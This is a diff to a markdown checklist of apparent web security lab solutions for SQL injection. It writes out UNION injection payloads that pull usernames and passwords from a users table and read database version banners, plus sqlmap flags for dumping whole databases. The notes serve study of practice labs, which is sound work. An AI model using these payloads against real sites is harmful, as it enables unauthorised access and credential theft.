@@ -27,15 +27,32 @@
 - [X] SQL injection UNION attack, retrieving multiple values in a single column
 
     `?category=Pets'+UNION+SELECT+NULL,CONCAT(username,'+',password)+FROM+users--`
-    
-- [X] SQL injection attack, querying the database type and version on *Oracle*
+   
+- [X] SQL injection attack, querying the database type and version on Oracle
 
     `?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version--`
 
-- [ ] SQL injection attack, querying the database type and version on MySQL and Microsoft
+- [X] SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-- [ ] SQL injection attack, listing the database contents on non-Oracle databases
+    `?category=Gifts'+UNION+SELECT+@@version,+'a'#` # pour les commentaires en MySQL
 
+- [X] SQL injection attack, listing the database contents on non-Oracle databases
+
+    ```sqlmap -u URL
+    
+    --all #Retrieve everything
+    
+    --dump #Dump DBMS database table entries
+    
+    --dbs #Names of the available databases
+    
+    --tables #Tables of a database ( -D <DB NAME> )
+    
+    --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+    
+    -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column```
+    
+    
 - [ ] SQL injection attack, listing the database contents on Oracle
 
 - [ ] Blind SQL injection with conditional responses
